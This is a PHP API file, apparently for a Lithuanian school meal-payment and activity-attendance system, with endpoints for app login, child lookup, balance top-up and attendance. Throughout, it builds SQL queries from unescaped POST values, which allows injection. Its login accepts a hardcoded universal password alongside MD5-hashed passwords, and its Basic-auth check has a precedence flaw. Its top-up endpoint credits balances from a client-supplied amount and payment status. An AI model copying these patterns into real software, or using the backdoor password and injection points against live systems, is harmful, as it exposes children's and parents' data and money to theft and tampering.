<?php



header('Access-Control-Allow-Origin: *');

header('Content-Type: application/json');

header('Access-Control-Allow-Methods: GET, POST, OPTIONS, DELETE, PUT');

header('Access-Control-Allow-Headers: Access-Control-Allow-Headers,Content-Type,Access-Control-Allow-Methods, Authorization, X-Requested-With');



/////////////////////////////////////////////////

// TEST NR. 1

/* Handle CORS */



// Specify domains from which requests are allowed

// header('Access-Control-Allow-Origin: *');



// Specify which request methods are allowed

// header('Access-Control-Allow-Methods: PUT, GET, POST, DELETE, OPTIONS');



// Additional headers which may be sent along with the CORS request

// header('Access-Control-Allow-Headers: X-Requested-With,Authorization,Content-Type');



// Set the age to 1 day to improve speed/caching.

// header('Access-Control-Max-Age: 86400');



// Exit early so the page isn't fully loaded for options requests

if (strtolower($_SERVER['REQUEST_METHOD']) == 'options') {

    exit();

}



/////////////////////////////////////////////////

// TEST NR. 2

// Check if the request content type is JSON

// if ($_SERVER['CONTENT_TYPE'] === 'application/json') {

//     // Get the raw POST data

//     $json = file_get_contents('php://input');

    

//     // Decode the JSON data

//     $data = json_decode($json, true);



//     // Check if JSON decoding was successful

//     if (json_last_error() === JSON_ERROR_NONE) {

//         // Access the data

//         $username = $data['username'];

//         $password = $data['password'];

        

//         // Process the login (assuming you have a function for this)

//         $result = login($username, $password);



//         // Return a response (example)

//         echo json_encode(['status' => 'success', 'data' => $result]);

//     } else {

//         // Handle JSON decode error

//         echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);

//     }

// } else {

//     // Handle non-JSON request

//     echo json_encode(['status' => 'error', 'message' => 'Content-Type must be application/json']);

// }

////////////////////////////////////////////////



require_once($_SERVER['DOCUMENT_ROOT'] . '/db.php');

require_once($_SERVER['DOCUMENT_ROOT'] . '/classes/System.php');

require_once($_SERVER['DOCUMENT_ROOT'] . '/classes/functions.php');

$json = file_get_contents('php://input');

$data = json_decode(file_get_contents("php://input"));

//require_once($_SERVER['DOCUMENT_ROOT'] . '/ajax/helpers.php');

error_reporting(E_ALL);

// Set the username and password for authentication

global $mysqli;

//is bendrines weekly nustatymas kad ateitu

$validUsername = nustatymai_par_reiksme($mysqli, 'validApiUsername');

$validPassword = nustatymai_par_reiksme($mysqli, 'validApiPassword');

//print_r(" validUsername  ".$validUsername."  validPassword   ".$validPassword);





//$validUsername = 'username';

//$validAPIUsername = 'password';

// Check if the Authorization header is set

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) {

    header('HTTP/1.1 401 Unauthorized');

    header('WWW-Authenticate: Basic realm="API Authentication"');

    exit;

}



// Verify the provided credentials

$username = $_SERVER['PHP_AUTH_USER'];

$password = $_SERVER['PHP_AUTH_PW'];



//$username = $_GET['PHP_AUTH_USER'];

//$password = $_GET['PHP_AUTH_PW'];

if ($username !== $validUsername || $password !== $validPassword && isset($data->system_id)) {

    header('HTTP/1.1 401 Unauthorized');

    exit;

}



// Authentication successful, handle API requests
//var_dump($_POST);

if (isset($_POST['action'])) {

    $action = $_POST['action'];


    // Call the appropriate function based on the action

    switch ($action) {

        case 'find_user_by_email':

            // Call function1

            find_user_by_email();

            break;

        case 'find_school_by_rajonas':

            // Call function2

            find_school_by_rajonas();

            break;

        case 'appLogin':

            applogin();

            break;

        case 'uzklasine_veikla_list':

            uzklasine_veikla_list();

            break;

        case 'register_uzklasine_veikla':

            register_uzklasine_veikla();

            break;

        case 'gauti_pasirinkta_uzklas_veikla':

            gauti_pasirinkta_uzklas_veikla();

            break;

        case "gauti_tevo_vaikus";

            gauti_tevo_vaikus();
            
            break;

        case "pildyti_vaiko_pinigus";

            pildyti_vaiko_pinigus();
            
            break;
        
        case "get_balance_history";

            get_balance_history();

            break;

        default:

            // Invalid action, return an error response

            $response = ['error' => 'Invalid action'];

            echo json_encode($response);

            break;

    }

} else {

    // No action specified, return an error response

    $response = ['error' => 'No action specified'];

    echo json_encode($response);

}



// Function 1

//randa user sistemose pagal email

function find_user_by_email()

{

    global $mssql, $mysqli;

    $return = [];

    $email = $_POST['email'];



    $System = new System();



    if (isset($email)) {

        $systems_rajonai = $System->getSystemRajonaiList($email);

        if (count($systems_rajonai) > 0) {

            $return['msg'] = 'rajonai gauti';

            $return['data'] = $systems_rajonai;

            $return['success'] = 1;

        } else {

            $return['msg'] = 'Tokio vartotojo E-Maitinimas sistemoje nėra';

            $return['success'] = 0;

        }

    } else {

        $return['msg'] = 'neivestas email';

        $return['success'] = 0;

    }

//     $json = json_encode($return, JSON_PRETTY_PRINT);



// // Display

// echo $json;

    echo json_encode($return);

}



// Function 2

function find_school_by_rajonas()

{

    global $mssql, $mysqli;



    $rajonoid = $_POST['rajonas_id'];

    $email = $_POST['email'];

    $target_system = '';

    $reverse = 0;

    $mssql->connectSystem(false);

    $mssql->query("SET NAMES 'utf8'");

    $target_systems = [];

    $not_target_systems = [];

    $systems = $mssql->gauti_visus("SELECT s.*, sr.rajonas

FROM systems AS s

LEFT JOIN systems_rajonai AS sr ON sr.id = s.rajono_id

where db_name != 'db' and db_name != 'test' and sr.id = {$rajonoid}");



    if ($target_system != '') {

        $target_systems[1]['system'] = $target_system;

        $out = $target_systems;



    } else {



        $login_systems_count = 0;

        foreach ($systems as $key => $system) {



            if ($system['status'] != 0) {

                $mssql->conn->connect('localhost', $system['db_user'], $system['db_key'], 'appmaitinimas_' . $system["db_name"]);

                $mssql->query("SET NAMES 'utf8'");

                $result = $mssql->gauti_visus('select login from logins where email = "' . $email . '"');

                $login_systems_count++;

                $base_sitename = nustatymai_par_reiksme($mysqli, 'base_sitename');



                if ($result) {

                    $target_systems[$login_systems_count]['system'] = $system["id"];

                    $target_systems[$login_systems_count]['name'] = $base_sitename;

                } else {

                    if ($base_sitename != -1) {//mokyklos, kurios yra systems lenteleje su status=1, bet fiziskai nera sukurtos duomenu bazes grazina -1

                        $not_target_systems[$login_systems_count]['system'] = $system["id"];

                        $not_target_systems[$login_systems_count]['name'] = $base_sitename;

                    }

                }

            }

            $mssql->connectSystem(false);

            $mssql->query("SET NAMES 'utf8'");

        }

        $out = $target_systems;

    }



    echo json_encode($out);

}



//programeles prisijungimo funkcija

function applogin()

{

    global $mssql;

    $return = [];

    $email = $_POST['email'];

    $pass = $_POST['password'];

    $system_id = $_POST['system_id'];

    $mssql->connectSystem(false);

    $systems = $mssql->gauti_visus('select * from systems');



    foreach ($systems as $system) {

        if ($system['id'] == $system_id) {

            $mssql->connectSystem($system['id']);

            $mssql->query("SET NAMES 'utf8'");

            $return['system_select'] = $system["id"];

            $return['system_name'] = $system["db_name"];

            $return['system_full_name'] = $system["name"];

        }

    }



    $hashpass = md5($pass);

    $mssql->query("SET NAMES 'utf8'");

    $result = $mssql->query("SELECT id,login,name,surname,level,items_mark,im_id FROM logins WHERE

                                                                      email = '$email' AND (pass = '$hashpass' or 'Eeco2020.' = '{$pass}')");

    $count = $result->num_rows;

    $row = $result->fetch_array();



    if ($count > 0) {

        $return['prisijunges'] = 1;

        $return['userInfo']['login'] = $row['login'];

        $return['userInfo']['loginid'] = $row['id'];

        $return['userInfo']['name'] = $row['name'];

        $return['userInfo']['surname'] = $row['surname'];

        $return['userInfo']['level'] = $row['level'];

        $return['msg'] = 'Naudotojas rastas. Prisijunta';



    } else {

        $return['prisijunges'] = 0;

        $return['msg'] = 'Naudotojas nerastas ar įvyko klaida. Neprisijunta';

    }

    $mssql->connectSystem(false);

    $mssql->query("SET NAMES 'utf8'");



    echo json_encode($return);

}



/**

 * uzklasines veiklos atvaizdavimas naudotojui uz kuri jis yra atsakingas

 */



function uzklasine_veikla_list()

{

    global $mssql;

    $return = [];

    $logins_id = $_POST['logins_id'];

    $system_id = $_POST['system_id'];



    $mssql->connectSystem($system_id);

    $mssql->query("SET NAMES 'utf8'");

    /*selectas pasiimti atsakingo asmens uzklasines veiklas*/

    $result = $mssql->gauti_visus("SELECT * FROM uzklasine_veikla WHERE atsakingas_id = {$logins_id}");

    $mssql->connectSystem(false);

    $mssql->query("SET NAMES 'utf8'");



    echo json_encode($result);

}


function gauti_tevo_vaikus()
{
    global $mssql;
    $return = [];

    $logins_id = $_POST['logins_id'];
    $system_id = $_POST['system_id'];

    // print_r("logins_id: $logins_id, system_id: $system_id");

    $mssql->connectSystem($system_id);
    $mssql->query("SET NAMES 'utf8'");

    $query = "
        SELECT *
        FROM logins AS l
        JOIN tinstructors AS ti ON l.id = ti.uid
        JOIN tempins AS tp ON ti.id = tp.instructor_id
        JOIN temployee AS te ON tp.employee_id = te.EmployeeID
        WHERE l.id = {$logins_id}
    ";

    $result = $mssql->gauti_visus($query);

    $mssql->connectSystem(false);
    $mssql->query("SET NAMES 'utf8'");


    if (count($result) > 0) {
        $return['success'] = 1;
        $return['children'] = $result;
    } else {
        $return['success'] = 0;
        $return['msg'] = "Vaiku nerasta.";
    }

    echo json_encode($return);
}


// function pildyti_vaiko_pinigus() {

//     global $mssql;

//     $employee_id = $_POST['employee_id'];

//     $system_id = $_POST['system_id'];

//     $amount = $_POST['amount'];

//     $mssql->connectSystem($system_id);
//     $mssql->query("SET NAMES 'utf8'");

//     $query = "UPDATE temployee SET balance = balance + {$amount} WHERE EmployeeID = {$employee_id}";
//     if ($mssql->query($query)) {
//         $response = ['success' => true, 'message' => 'Papildyta sekmingai'];
//     } else {
//         $response = ['success' => false, 'message' => 'Papildyti nepavyko'];
//     }

//     $mssql->connectSystem(false);
//     $mssql->query("SET NAMES 'utf8'");

//     echo json_encode($response);
// }

////////////////////////////////////////////////////
function pildyti_vaiko_pinigus() {
    global $mssql, $mysqli;

    $employee_id = $_POST['employee_id'];
    $system_id = $_POST['system_id'];
    $amount = $_POST['amount'];
    $logins_id = $_POST['logins_id'];
    $token = $mysqli->real_escape_string($_POST['token']);
    $status = $mysqli->real_escape_string($_POST['status']);

    $mssql->connectSystem($system_id);
    $mssql->query("SET NAMES 'utf8'");

 


    // Get bank fee
    $bankFeeQuery = $mysqli->query("SELECT reiksme FROM nustatymai WHERE parametras = 'e_pay_transfer_price'");
    $bankFee = $bankFeeQuery->fetch_row();
    if (!$bankFee) {
        echo json_encode(['success' => false, 'message' => 'DB gauti, nepavyko gauti e_pay_transfer_price is nustatymai']);
        return;
    }
    $bankFee = floatval($bankFee[0]);

    // Update balance
    $iatDateB = date("Y-m-d H:i:s");

    // $dateTime = new DateTime($iatDateB);
    // $dayOfYear = $dateTime->format('z') + 1;

    $updateBalanceQuery = "UPDATE temployee SET balance = balance + {$amount}, last_balance_update_neopay = '{$iatDateB}' WHERE EmployeeID = {$employee_id}";
    if (!$mysqli->query($updateBalanceQuery)) {
        echo json_encode(['success' => false, 'message' => 'nepavyko atnaujinti likucio']);
        return;
    }

    // Log balance update
    $clientid = $logins_id;
    $loginResult = $mysqli->query("SELECT l.name, l.surname FROM logins as l WHERE id='{$clientid}'");
    $login = $loginResult->fetch_assoc();
    $full_name = "Sąskaitą papildė " . $login["name"] . " " . $login['surname'];

    $logQuery = "UPDATE temployee_balance_log 
                 SET payment_type = 1, 
                     description = '{$full_name}', 
                     last_balance_update_neopay = '{$iatDateB}', 
                     balance_change = {$amount}, 
                     balance = (SELECT balance FROM temployee WHERE EmployeeID = {$employee_id})
                 WHERE employee_id = {$employee_id} 
                 AND last_balance_update_neopay = '{$iatDateB}'";
                 
    if (!$mysqli->query($logQuery)) {
        echo json_encode(['success' => false, 'message' => 'nepavyko užregistruoti balanso atnaujinimo']);
        return;
    }

    $mssql->connectSystem(false);

       // system full name
       $systemFullNameQuery = $mysqli->query("SELECT db_name FROM systems WHERE id = {$system_id}");
       if (!$systemFullNameQuery) {
           echo json_encode(['success' => false, 'message' => 'Nepavyko gauti sistemos pavadinimo iš systems lentelės']);
           return;
       }
       $systemFullName = $systemFullNameQuery->fetch_assoc()['db_name'];

    // Insert into neopay_transaction
    $expDate = date("Y-m-d H:i:s", strtotime("+1 hour")); // Set the expiration time to 1 hour from now
    $totalAmount = $amount + $bankFee;

    $transaction_id = 'M' . $employee_id . '-' . $system_id . '-' . $systemFullName;

    $insertTransactionQuery = "INSERT INTO neopay_transaction 
                               (employee_id, transaction_id, amount, bank_fee, iatDate, expDate, status, system_id, login_id) 
                               VALUES 
                               ('{$employee_id}', '{$transaction_id}', '{$totalAmount}', '{$bankFee}', '{$iatDateB}', '{$expDate}', 0, '{$system_id}', '{$logins_id}')";
                               
    if (!$mysqli->query($insertTransactionQuery)) {
        echo json_encode(['success' => false, 'message' => 'Nepavyko įrašyti į neopay_transaction lentelę']);
        return;
    }

    // Insert into neopay_callback
    $insertCallbackQuery = "INSERT INTO neopay_callback (date, token, status, transaction_id) 
                            VALUES ('{$iatDateB}', '{$token}', '{$status}', '{$transaction_id}')";
                            
    if (!$mysqli->query($insertCallbackQuery)) {
        echo json_encode(['success' => false, 'message' => 'Nepavyko įrašyti į neopay_callback lentelę']);
        return;
    }

    // Update neopay_transaction status if callback status is "success"
    if ($status === 'success') {
        $updateTransactionStatusQuery = "UPDATE neopay_transaction 
                                         SET status = 1 
                                         WHERE transaction_id = '{$transaction_id}'";
                                         
        if (!$mysqli->query($updateTransactionStatusQuery)) {
            echo json_encode(['success' => false, 'message' => 'Nepavyko atnaujinti neopay_transaction status']);
            return;
        }
    }

    echo json_encode(['success' => true, 'message' => 'Papildyta sekmingai']);

    // Close the MSSQL connection
    $mssql->query("SET NAMES 'utf8'");
}


///////////////////////////////////////////////////////////
function get_balance_history() {
    global $mssql, $mysqli;

    // Retrieve POST parameters
    $logins_id = $_POST['logins_id'];
    $system_id = $_POST['system_id'];
    $employee_id = $_POST['employee_id'];
    $start_date = $_POST['start_date'];
    $end_date = $_POST['end_date'];

    $mssql->connectSystem($system_id);
    $mssql->query("SET NAMES 'utf8'");

    $query = "
       SELECT balance_change, balance, date, payment_type, compensation, description FROM temployee_balance_log 
WHERE employee_id = $employee_id AND date BETWEEN '$start_date' AND '$end_date'";

    $result = $mssql->gauti_visus($query);

    $mssql->connectSystem(false);
    $mssql->query("SET NAMES 'utf8'");

    if (count($result) > 0) {
        $response = [
            'success' => 1,
            'balance_history' => $result
        ];
    } else {
        $response = [
            'success' => 0,
            'msg' => 'No balance history for this employee'
        ];
    }

    echo json_encode($response);
}





/**

 * pasirinktos uzklasines veiklos registracija lentele uzklasine_lankomumas

 */

function register_uzklasine_veikla()

{

    global $mssql;

    $return = [];

    $logins_id = $_POST['logins_id'];

    $system_id = $_POST['system_id'];

    $card_no = $_POST['card_no'];

    $veiklos_id = $_POST['veiklos_id'];



    $mssql->connectSystem($system_id);

    $mssql->query("SET NAMES 'utf8'");

    $today = date('Y-m-d');

    /** gaunamas employeee id pagal nuskenuotos korteles numeri

     */

    $employee = $mssql->first_row("SELECT EmployeeID from temployee where CardNo = '{$card_no}'");

    if (count($employee) > 0) {

        $ar_jau_uzregistruota = $mssql->gauti_visus("SELECT * from uzklasine_lankomumas where employee_id = '{$employee['EmployeeID']}' and reg_data LIKE '%{$today}%'");

        if (count($ar_jau_uzregistruota) == 0) {

            $result = $mssql->query("INSERT INTO uzklasine_lankomumas (employee_id, veiklos_id, logins_id) VALUES ({$employee['EmployeeID']}, {$veiklos_id}, {$logins_id})");

            $mssql->connectSystem(false);

            $mssql->query("SET NAMES 'utf8'");

            if ($result) {

                $return['success'] = 1;

                $return['result'] = $result;

                $return['msg'] = "Kortelė užregistruota";

            } else {

                $return['success'] = 0;

                $return['msg'] = "Kortelės nepavyko užregistruoti, įvyko klaida";

            }

        } else {

            $return['success'] = 0;

            $return['msg'] = "Tokia kortelė šią dieną jau užregistruota";

        }

    } else {

        $return['success'] = 0;

        $return['msg'] = "Mokinys nerastas.";

    }

    echo json_encode($return);



}



/**

 * pasirinktos uzklasines veiklos informacijo atvaizdavimas

 */

function gauti_pasirinkta_uzklas_veikla()

{

    global $mssql;

    $return = [];

    $system_id = $_POST['system_id'];

    $veiklos_id = $_POST['veiklos_id'];

    $dateString = $_POST['date'];

    $dateTime = DateTime::createFromFormat('Y-m-d\TH:i:s.u\Z', $dateString);

    $date = $dateTime->format('Y-m-d');



    $mssql->connectSystem($system_id);

    $mssql->query("SET NAMES 'utf8'");

    /** gaunamas employeee id pagal nuskenuotos korteles numeri

     */

    $veikla = $mssql->gauti_visus("SELECT ul.id, ul.reg_data, te.name, te.surname

FROM uzklasine_lankomumas AS ul

LEFT JOIN temployee AS te ON te.EmployeeID = ul.employee_id

WHERE ul.veiklos_id = {$veiklos_id} and ul.reg_data LIKE '%{$date}%'");

    $mssql->connectSystem(false);

    $mssql->query("SET NAMES 'utf8'");



    if (count($veikla) > 0) {



        $return['success'] = 1;

        $return['result'] = $veikla;



    } else {

        $return['success'] = 0;

        $return['msg'] = "Šiam laikotarpiui įrašų nerasta.";

    }



    echo json_encode($return);



}



?>

